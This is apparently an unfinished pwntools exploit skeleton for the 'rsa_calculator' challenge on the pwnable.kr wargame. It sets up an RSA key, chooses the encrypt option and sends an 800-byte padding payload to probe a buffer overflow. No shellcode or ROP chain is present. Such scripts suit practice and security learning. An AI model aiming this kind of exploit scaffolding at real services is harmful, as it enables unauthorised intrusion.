from pwn import *
import sys
import time

# context
context.arch="amd64"
context.kernel="amd64"
context.os="linux"
context.log_level="debug"


# Binary specific settings
libc_name="[ENTER NAME]"
binary_name = "rsa_calculator"
REMOTE = "nc pwnable.kr 9012"

# Set up actual exploitation parameters
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)
libc=e.libc # So long as i'm not running against the remote target, use the local libc
context.binary = e

# If i need to use a different libc, we will pass it through LD_PRELOAD 

# env=dict(os.environ) # make a copy
# env["LD_PRELOAD"]="/path/to/libc"

def recieveMenu(p):
    p.recvlines(6)

def setKey(process, p, q, e, d):
    process.sendline(b"1")
    process.sendline(p)
    process.sendline(q)
    process.sendline(e)
    process.sendline(d)
    process.recvlines(15)

def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
            ip, port = REMOTE.replace("nc ", "").split(" ")
            port = int(port)
            p = remote(ip, port)
            libc = ELF(f"./{libc_name}")
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(f"./{binary_name}", gdbscript="b *0x400F94", aslr=False)
        else:
            p = process(f"./{binary_name}")
    # vars
    max_size = b"1024"


    p.recvlines(3) # opening message
    recieveMenu(p)
    setKey(p,b"256",b"1",b"1",b"0")
    p.sendline(b"2") # encrypt
    p.recvuntil(b"(max=1024) : ")
    p.sendline(max_size)
    p.recvline()

    payload = b"A" *800

    p.sendline(payload)
    p.interactive()



main()


